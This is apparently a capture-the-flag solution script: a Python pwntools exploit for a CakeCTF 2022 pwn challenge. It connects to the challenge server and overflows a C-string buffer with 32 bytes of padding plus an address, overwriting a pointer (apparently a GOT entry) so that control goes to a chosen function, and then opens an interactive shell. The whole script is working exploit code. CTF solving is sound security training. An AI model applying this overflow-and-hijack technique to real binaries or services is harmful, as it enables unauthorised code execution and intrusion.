#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./chall")
# p = elf.process()
# gdb.attach(p)
# 
p = remote("pwn1.2022.cakectf.com",9003)

def set_str(data):
	p.sendlineafter("choice: ","3")
	p.sendlineafter("str: ",data)

def set_cstr(data):
	p.sendlineafter("choice: ","1")
	p.sendlineafter("c_str: ",data)

def get_str():
	p.sendlineafter("choice: ","2")
	return p.recvline()[:-1]

def get_cstr():
	p.sendlineafter("choice: ","4")
	return p.recvline()[:-1]


set_str('0'*20)
set_cstr(b'a'*32+p64(0x404040))
set_str(p64(0x00000000004016de))
p.sendline('4')
p.interactive()